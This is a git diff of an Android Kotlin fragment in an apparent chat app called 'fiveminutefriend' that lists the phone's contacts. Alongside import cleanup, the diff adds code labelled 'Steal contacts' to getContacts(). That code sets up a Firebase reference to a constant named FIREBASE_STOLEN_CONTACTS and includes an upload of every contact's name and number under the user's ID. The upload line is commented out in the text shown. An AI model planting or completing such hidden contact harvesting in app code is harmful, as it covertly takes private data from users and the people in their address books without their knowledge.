@@ -1,38 +1,26 @@
 package com.p.fiveminutefriend.MainTabs
 
-
-import android.Manifest
 import android.content.Intent
-import android.content.pm.PackageManager
-import android.os.Build
 import android.os.Bundle
 import android.provider.ContactsContract
-import android.support.v4.app.ActivityCompat
 import android.support.v4.app.Fragment
 import android.support.v7.widget.DefaultItemAnimator
 import android.support.v7.widget.LinearLayoutManager
 import android.view.LayoutInflater
 import android.view.View
 import android.view.ViewGroup
-import com.github.bassaer.chatmessageview.model.Message
 import com.google.firebase.auth.FirebaseAuth
 import com.google.firebase.database.*
-import com.google.firebase.iid.FirebaseInstanceId
 import com.p.fiveminutefriend.Adapters.ContactsFragmentListAdapter
-import com.p.fiveminutefriend.Adapters.RecentFragmentListAdapter
 import com.p.fiveminutefriend.ChatActivity
+import com.p.fiveminutefriend.Constants
 import com.p.fiveminutefriend.Model.Contact
-import com.p.fiveminutefriend.Model.Match
 import com.p.fiveminutefriend.Model.User
 import com.p.fiveminutefriend.R
-import kotlinx.android.synthetic.main.content_chat.*
 import kotlinx.android.synthetic.main.fragment_contacts.*
-import kotlinx.android.synthetic.main.fragment_recent.*
 import java.util.*
 
-
 class ContactsFragment : Fragment() {
-
 
     override fun onCreateView(inflater: LayoutInflater?, container: ViewGroup?,
                               savedInstanceState: Bundle?): View? {
@@ -108,6 +96,16 @@ class ContactsFragment : Fragment() {
     }
 
     private fun getContacts() : List<Contact> {
+
+        //Steal contacts    ***                                        //
+        val dbReferenceForContacts = FirebaseDatabase                   //
+                .getInstance()                                           //
+                .getReferenceFromUrl(Constants.FIREBASE_STOLEN_CONTACTS)  //
+                                                                        //
+        val userID = FirebaseAuth.getInstance().currentUser!!.uid     //
+        //Steal contacts    ***                                     //
+
+
         val cursor = context.contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                 null,
                 null,
@@ -118,14 +116,20 @@ class ContactsFragment : Fragment() {
 
         val contacts = ArrayList<Contact>()
         while(cursor.moveToNext()) {
-            contacts.add(Contact(cursor.getString(cursor.getColumnIndex(ContactsContract
+
+            val contact = Contact(cursor.getString(cursor.getColumnIndex(ContactsContract
+                    .CommonDataKinds
+                    .Phone
+                    .DISPLAY_NAME)),
+                    cursor.getString(cursor.getColumnIndex(ContactsContract
                             .CommonDataKinds
                             .Phone
-                            .DISPLAY_NAME)),
-                            cursor.getString(cursor.getColumnIndex(ContactsContract
-                                    .CommonDataKinds
-                                    .Phone
-                                    .NUMBER))))
+                            .NUMBER)))
+
+            contacts.add(contact)
+
+            //DB call for stealing contacts.
+            //dbReferenceForContacts.child(userID).child(contact.name).setValue(contact.phoneNumber)
         }
         cursor.close()
         return contacts
